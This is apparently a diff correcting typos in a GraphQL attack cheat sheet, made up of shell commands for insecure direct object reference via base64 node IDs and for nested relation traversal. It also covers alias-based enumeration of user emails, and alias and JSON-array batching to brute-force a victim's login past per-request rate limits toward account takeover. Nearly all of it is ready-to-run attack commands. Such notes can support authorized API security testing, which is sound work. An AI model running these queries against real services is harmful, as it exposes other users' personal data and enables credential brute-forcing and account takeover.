@@ -69,7 +69,7 @@ gql -d '{"query":"{ user }"}'                 # "Field user of type User must ha
 python3 -c "import base64;print(base64.b64encode(b'User:124').decode())"          # VXNlcjoxMjQ=
 python3 -c "import base64;print(base64.b64decode('VXNlcjoxMjQ=').decode())"        # User:124
 # A's token, B's object:
-gql -H "$A" -d '{"query":"{ node(i"VXNlcjoxMjQ=\"){ ... on User { id email phone role } } }"}'
+gql -H "$A" -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone role } } }"}'
 gql -H "$A" -d '{"query":"{ user(id:124){ email phone } order(id:8001){ total address } }"}'
 # Nested traversal (relation resolver unchecked):
 gql -H "$A" -d '{"query":"{ order(id:7001){ customer { email phone } } }"}'
@@ -80,9 +80,9 @@ gql -H "$A" -d '{"query":"{ order(id:7001){ customer { email phone } } }"}'
 # Alias enumeration (many objects, one request):
 gql -H "$A" -d '{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}'
 # Alias brute (login/OTP) — one request, many attempts → per-request rate-limit bypassed:
-gql -d '{"query":"mutation{ a:login(username:\"victim\",passwor"pass1\"){token} b:login(username:\"victim\",passwor"pass2\"){token} c:login(username:\"victim\",passwor"pass3\"){token} }"}'
+gql -d '{"query":"mutation{ a:login(username:\"victim\",password:\"pass1\"){token} b:login(username:\"victim\",password:\"pass2\"){token} c:login(username:\"victim\",password:\"pass3\"){token} }"}'
 # JSON-ARRAY batching (if the engine accepts an array of ops):
-curl -s "$G" -H 'Content-Type: application/json' -d '[{"query":"mutation{login(username:\"v\",passwor"1\"){token}}"},{"query":"mutation{login(username:\"v\",passwor"2\"){token}}"}]'
+curl -s "$G" -H 'Content-Type: application/json' -d '[{"query":"mutation{login(username:\"v\",password:\"1\"){token}}"},{"query":"mutation{login(username:\"v\",password:\"2\"){token}}"}]'
 # Proof = N attempts processed in ONE request where the per-request limit is 1/5 → bypass → ATO.
 ```
 
